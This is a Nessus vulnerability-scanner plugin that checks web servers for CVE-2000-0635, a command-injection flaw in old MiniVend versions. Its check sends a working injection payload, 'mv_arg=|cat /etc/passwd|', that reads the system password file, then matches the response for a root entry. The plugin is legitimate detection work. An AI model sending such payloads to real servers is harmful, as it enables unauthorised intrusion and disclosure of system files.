#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10473);
 script_bugtraq_id(1449);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-2000-0635");
 name["english"] = "MiniVend Piped command";
 name["francais"] = "MiniVend Piped command";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
You are using an older version of the MiniVend software,
which allows attackers to execute arbitrary commands on this
server.

Solution : upgrade to the latest version (www.minivend.com)
Risk factor : High";



 desc["francais"] = "
Vous utilisez une vieille version de MiniVend, qui permet
à un intrus d'éxecuter des commandes arbitraires sur
ce serveur.

Solution : mettez-le à jour (www.minivend.com)
Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/simple/view_page";
 summary["francais"] = "Vérifie la présence de /cgi-bin/simple/view_page";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = string(dir, "/simple/view_page?mv_arg=|cat%20/etc/passwd|");
 req = http_get(item:req, port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL ) exit(0);
 if(egrep(pattern:"root:.*:0:[01]:", string:r))security_hole(port);
}
